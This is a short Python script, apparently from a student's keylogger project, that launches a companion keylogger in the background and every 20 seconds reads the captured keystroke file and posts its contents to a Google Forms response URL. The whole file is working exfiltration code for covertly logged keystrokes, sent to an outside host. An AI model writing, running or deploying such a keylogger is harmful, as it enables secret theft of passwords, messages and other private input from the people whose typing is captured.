#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/student/Desktop/GitHub/Python_Scripts/Keylogger_Remote_Form/keyloggerRemoteTest.py &")
time.sleep(1)

def send_request():
	form_input = open("/home/student/Desktop/GitHub/Python_Scripts/Keylogger_Remote_Form/keyboard_Input.txt")
	form_send = form_input.read()
	url ='https://docs.google.com/forms/u/1/d/e/1FAIpQLSf0jT8Vq-jk-IDwS9Hw8uyjac99AVZCE5VM_7Zf2At4MniFfg/formResponse'
	form_data = {'entry.839337160': f"'{form_send}'"}
	r = requests.post(url, data=form_data)

def interval():
	global startlog
	if time.time() - 20 > startlog:
#		print('Its been 20 seconds')
		send_request()
		startlog = time.time()

counter = 0
while True:
	counter += 1
#	print(counter)
	interval()
	time.sleep(1)
